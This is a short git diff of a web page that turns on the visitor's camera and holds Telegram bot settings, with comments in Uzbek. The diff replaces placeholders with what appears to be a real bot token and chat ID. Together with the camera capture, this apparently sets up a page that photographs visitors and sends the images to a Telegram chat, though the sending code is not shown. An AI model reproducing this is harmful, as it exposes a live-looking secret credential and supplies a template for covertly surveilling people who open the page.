@@ -57,11 +57,11 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
 
-        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // Bot tokeningizni kiriting
-        const CHAT_ID = "YOUR_CHAT_ID"; // Chat ID yoki guruh ID
+        const BOT_TOKEN = "7607886976:AAFeeYopg0dPPNk4x_3Ldm4pYSZU-RiHLlU"; // Bot tokeningizni kiriting
+        const CHAT_ID = "697727022"; // Chat ID yoki guruh ID
 
         async function initCamera() {
-            loader.style.display = "block"; // Loaderni ko'rsatish
+            loader.style.display = "block"; 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
